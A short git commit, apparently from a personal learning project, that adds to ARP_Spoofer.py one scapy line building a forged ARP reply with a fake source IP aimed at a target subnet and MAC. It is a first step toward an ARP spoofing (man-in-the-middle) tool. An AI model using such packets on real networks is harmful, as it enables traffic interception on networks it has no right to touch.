1cb6031e5a351dfffd2dfb0e7526d53bbaab4817
Paul St. Amour <paul35444@aol.com>
2021-02-23 10:52:06 -0600

    - created packet to send to target from fake source

--- ARP_Spoofer.py
+++ ARP_Spoofer.py
@@ -2,3 +2,5 @@
 
 import scapy.all as scapy
 
+packet = scapy.ARP(op=2, pdst="10.0.0.1/24", hwdst="08:00:27:01:af:01", psrc="10.0.1.1") #op=2 creates response instead of request; pdst=IP; hwdst=MAC; psrc=source
+
